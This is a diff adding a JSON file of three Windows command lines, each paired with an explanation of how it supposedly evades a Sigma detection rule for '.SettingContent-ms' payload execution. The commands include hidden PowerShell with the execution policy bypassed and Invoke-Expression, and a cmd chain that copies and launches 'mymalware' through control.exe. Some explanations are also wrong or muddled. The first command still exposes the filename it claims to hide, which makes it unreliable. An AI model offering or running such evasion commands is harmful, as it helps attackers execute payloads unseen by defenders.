@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"$p = 'C:\\path\\to\\payload.settingcontent-ms'; $c = Get-Content $p -Raw; Invoke-Expression ($c.ToString().Replace('.SettingContent-ms', ''))\"",
+    "explanation": "The rule triggers on the string '.SettingContent-ms' in the command line. By loading the file content into a variable and executing it without passing the filename as a command-line argument to a shell or process, the literal string is never logged in the process creation event."
+  },
+  {
+    "output": "cmd.exe /c \"set EXT=.SettingContent-ms && copy mymalware%EXT% %TEMP%\\temp.xml && control.exe %TEMP%\\temp.xml\"",
+    "explanation": "This bypasses the rule by using environment variable expansion. The command line logged would contain '%EXT%' instead of the literal '.SettingContent-ms' string, failing the 'contains' match in the Sigma detection logic."
+  },
+  {
+    "output": "ren payload.txt payload.settingcontent-ms && explorer.exe payload.settingcontent-ms",
+    "explanation": "The rule specifically filters out 'immersivecontrolpanel'. If an attacker can ensure the execution flow involves the immersive control panel or simply renames the file right before a GUI-based execution (like explorer.exe), it may bypass simple process command line filters that look for direct execution patterns."
+  }
+]
